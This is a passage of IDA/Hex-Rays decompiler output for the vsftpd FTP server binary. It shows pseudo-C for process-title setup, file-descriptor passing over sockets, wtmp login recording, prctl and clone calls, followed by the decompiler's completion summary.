  unsigned int v3; // eax
  unsigned int v4; // ebp
  const void *v5; // rax
  char *v6[2]; // [rsp+0h] [rbp-48h] BYREF
  char *v7[3]; // [rsp+10h] [rbp-38h] BYREF
  unsigned __int64 v8; // [rsp+28h] [rbp-20h]

  v6[0] = 0LL;
  v6[1] = 0LL;
  v8 = __readfsqword(0x28u);
  sub_C3A0((__int64)v6, (__int64)&unk_2219B0);
  if ( !sub_C4F0((__int64)v6) )
    sub_C670(v6, ": ");
  sub_C670(v6, a1);
  v1 = (const char *)sub_C510(v6);
  v7[0] = 0LL;
  v7[1] = 0LL;
  if ( !dword_2219C8 )
    sub_4B30("vsf_sysutil_setproctitle: not initialized");
  sub_13650((void *)qword_2219C0, dword_2219CC);
  if ( (unsigned int)dword_2219CC > 0x1F )
  {
    sub_C370((__int64)v7, "vsftpd: ");
    sub_C670(v7, v1);
    v3 = sub_C500((__int64)v7);
    v4 = dword_2219CC - 1;
    if ( dword_2219CC - 1 > v3 )
      v4 = v3;
    v5 = (const void *)sub_C510(v7);
    sub_13670((void *)qword_2219C0, v5, v4);
    sub_C440((__int64)v7);
    *(_BYTE *)(qword_2219C0 + v4) = 0;
  }
  sub_C440((__int64)v6);
  return __readfsqword(0x28u) ^ v8;
}
// 2219C0: using guessed type __int64 qword_2219C0;
// 2219C8: using guessed type int dword_2219C8;
// 2219CC: using guessed type int dword_2219CC;

//----- (0000000000016340) ----------------------------------------------------
unsigned __int64 __fastcall sub_16340(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return sub_161F0(v1);
}

//----- (0000000000016360) ----------------------------------------------------
void *__fastcall sub_16360(int a1, const char **a2)
{
  char **v3; // rbp
  bool v4; // zf
  __int64 v5; // rbx
  const char *v6; // rdi
  int v7; // eax
  unsigned int v8; // esi
  char *v9; // rdi

  v3 = environ;
  if ( dword_2219C8 )
    sub_4B30("vsf_sysutil_setproctitle_init called twice");
  v4 = *a2 == 0LL;
  dword_2219C8 = 1;
  if ( v4 )
    sub_4B80();
  if ( a1 > 0 )
  {
    v5 = 1LL;
    dword_2219CC += sub_13610(*a2) + 1;
    while ( (unsigned int)(a1 - 1) + 1LL != v5 )
    {
      dword_2219CC += sub_13610(a2[v5]) + 1;
      if ( (int)v5 > 0 )
        a2[v5] = 0LL;
      ++v5;
    }
  }
  v6 = *v3;
  if ( *v3 )
  {
    do
    {
      v7 = sub_13610(v6);
      v6 = *++v3;
      v8 = v7 + dword_2219CC + 1;
      v4 = *v3 == 0LL;
      dword_2219CC = v8;
    }
    while ( !v4 );
  }
  else
  {
    v8 = dword_2219CC;
  }
  v9 = (char *)*a2;
  environ = 0LL;
  qword_2219C0 = (__int64)v9;
  return sub_13650(v9, v8);
}
// 2219C0: using guessed type __int64 qword_2219C0;
// 2219C8: using guessed type int dword_2219C8;
// 2219CC: using guessed type int dword_2219CC;

//----- (00000000000164A0) ----------------------------------------------------
void *__fastcall sub_164A0(size_t len)
{
  void *result; // rax

  result = mmap(0LL, (unsigned int)len, 3, 34, -1, 0LL);
  if ( result == (void *)-1LL )
    sub_4B80();
  return result;
}

//----- (00000000000164F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_164F0(int a1, int a2)
{
  char v3; // [rsp+Fh] [rbp-79h] BYREF
  __int64 v4[2]; // [rsp+10h] [rbp-78h] BYREF
  struct msghdr message; // [rsp+20h] [rbp-68h] BYREF
  __int64 v6[2]; // [rsp+60h] [rbp-28h] BYREF
  int v7; // [rsp+70h] [rbp-18h]
  unsigned __int64 v8; // [rsp+78h] [rbp-10h]

  v8 = __readfsqword(0x28u);
  v7 = a2;
  v3 = 0;
  v6[0] = 20LL;
  message.msg_control = v6;
  message.msg_controllen = 20LL;
  v6[1] = 0x100000001LL;
  message.msg_name = 0LL;
  message.msg_namelen = 0;
  message.msg_iovlen = 1LL;
  message.msg_iov = (struct iovec *)v4;
  message.msg_flags = 0;
  v4[1] = 1LL;
  v4[0] = (__int64)&v3;
  if ( (unsigned int)sendmsg(a1, &message, 0) != 1 )
    sub_4B80();
  return __readfsqword(0x28u) ^ v8;
}

//----- (00000000000165C0) ----------------------------------------------------
__int64 __fastcall sub_165C0(int a1)
{
  __int64 result; // rax
  char v2; // [rsp+1Fh] [rbp-79h] BYREF
  __int64 v3[2]; // [rsp+20h] [rbp-78h] BYREF
  struct msghdr message; // [rsp+30h] [rbp-68h] BYREF
  char v5; // [rsp+70h] [rbp-28h] BYREF
  int v6; // [rsp+80h] [rbp-18h]
  unsigned __int64 v7; // [rsp+88h] [rbp-10h]

  v7 = __readfsqword(0x28u);
  v3[1] = 1LL;
  message.msg_name = 0LL;
  message.msg_namelen = 0;
  v3[0] = (__int64)&v2;
  message.msg_iovlen = 1LL;
  message.msg_controllen = 24LL;
  message.msg_flags = 0;
  message.msg_iov = (struct iovec *)v3;
  v6 = -1;
  message.msg_control = &v5;
  if ( (unsigned int)recvmsg(a1, &message, 0) != 1 )
    sub_4B80();
  if ( message.msg_controllen <= 0xF || !message.msg_control )
    sub_4B80();
  result = *((unsigned int *)message.msg_control + 4);
  if ( (_DWORD)result == -1 )
    sub_4B80();
  return result;
}

//----- (00000000000166D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_166D0(_QWORD *a1, _QWORD *a2)
{
  unsigned int v3; // eax
  const char *v4; // rsi
  const char *v5; // rax
  const char *v6; // rax
  char *v8[3]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+18h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  if ( dword_2219A0 )
    sub_4B30("vsf_insert_uwtmp");
  v8[0] = 0LL;
  v8[1] = 0LL;
  sub_C370((__int64)v8, "vsftpd:");
  v3 = sub_12BE0();
  sub_C6C0(v8, v3);
  if ( (unsigned int)sub_C500((__int64)v8) > 0x1F )
  {
    sub_C440((__int64)v8);
  }
  else
  {
    v4 = (const char *)sub_C510(v8);
    sub_13690(stru_221820.ut_line, v4, 0x20u);
    sub_C440((__int64)v8);
    dword_2219A0 = 1;
    stru_221820.ut_type = 7;
    stru_221820.ut_pid = sub_12BE0();
    v5 = (const char *)sub_C510(a1);
    sub_13690(stru_221820.ut_user, v5, 0x20u);
    v6 = (const char *)sub_C510(a2);
    sub_13690(stru_221820.ut_host, v6, 0x100u);
    stru_221820.ut_tv.tv_sec = sub_15470();
    setutxent();
    pututxline(&stru_221820);
    endutxent();
    updwtmpx("/var/log/wtmp", &stru_221820);
  }
  return __readfsqword(0x28u) ^ v9;
}
// 12BE0: using guessed type __int64 sub_12BE0(void);
// 2219A0: using guessed type int dword_2219A0;

//----- (00000000000168D0) ----------------------------------------------------
int sub_168D0()
{
  int result; // eax

  result = prctl(1, 9LL, 0LL, 0LL, 0LL);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000016910) ----------------------------------------------------
int sub_16910()
{
  int result; // eax

  result = prctl(1, 15LL, 0LL, 0LL, 0LL);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000016950) ----------------------------------------------------
__pid_t sub_16950()
{
  int v1; // eax
  int v2; // ebx
  int v3; // eax

  if ( !dword_2208B4 )
    return sub_12C60();
  v1 = syscall(56LL, 671088657LL, 0LL);
  v2 = v1;
  if ( v1 == -1 )
  {
    v3 = *__errno_location();
    if ( v3 == 22 || v3 == 1 )
    {
      dword_2208B4 = 0;
      return sub_12C60();
    }
    return v2;
  }
  if ( v1 )
    return v2;
  sub_15A50();
  return v2;
}
// 2208B4: using guessed type int dword_2208B4;

//----- (00000000000169C0) ----------------------------------------------------
__pid_t sub_169C0()
{
  int v0; // eax
  int v1; // ebx
  int v2; // eax

  if ( !dword_2208B8 )
    return sub_16950();
  v0 = syscall(56LL, 1744830481LL, 0LL);
  v1 = v0;
  if ( v0 == -1 )
  {
    v2 = *__errno_location();
    if ( v2 == 22 || v2 == 1 )
    {
      dword_2208B8 = 0;
      return sub_16950();
    }
    return v1;
  }
  if ( v0 )
    return v1;
  sub_15A50();
  return v1;
}
// 2208B8: using guessed type int dword_2208B8;

//----- (0000000000016A30) ----------------------------------------------------
__pid_t sub_16A30()
{
  int v1; // eax
  int v2; // ebx
  int v3; // eax

  if ( !dword_2208B0 )
    return sub_12C10();
  v1 = syscall(56LL, 1073741841LL, 0LL);
  v2 = v1;
  if ( v1 == -1 )
  {
    v3 = *__errno_location();
    if ( v3 == 22 || v3 == 1 )
    {
      dword_2208B0 = 0;
      return sub_12C10();
    }
    return v2;
  }
  if ( v1 )
    return v2;
  sub_15A50();
  return v2;
}
// 2208B0: using guessed type int dword_2208B0;

//----- (0000000000016AA0) ----------------------------------------------------
__int64 sub_16AA0()
{
  return syscall(39LL);
}
// 16AA0: using guessed type __int64 sub_16AA0();

//----- (0000000000016AC0) ----------------------------------------------------
void __fastcall init(unsigned int a1, __int64 a2, __int64 a3)
{
  signed __int64 v4; // rbp
  __int64 i; // rbx

  v4 = &off_21F9D8 - &funcs_16B09;
  init_proc();
  if ( v4 )
  {
    for ( i = 0LL; i != v4; ++i )
      ((void (__fastcall *)(_QWORD, __int64, __int64))*(&funcs_16B09 + i))(a1, a2, a3);
  }
}
// 4B20: using guessed type __int64 __fastcall sub_4B20(_QWORD, _QWORD, _QWORD);
// 21F9D0: using guessed type __int64 (__fastcall *funcs_16B09)();
// 21F9D8: using guessed type __int64 (__fastcall *off_21F9D8)();

//----- (0000000000016B34) ----------------------------------------------------
void term_proc()
{
  ;
}

// nfuncs=776 queued=441 decompiled=441 lumina nreq=0 worse=0 better=0
// ALL OK, 441 function(s) have been successfully decompiled
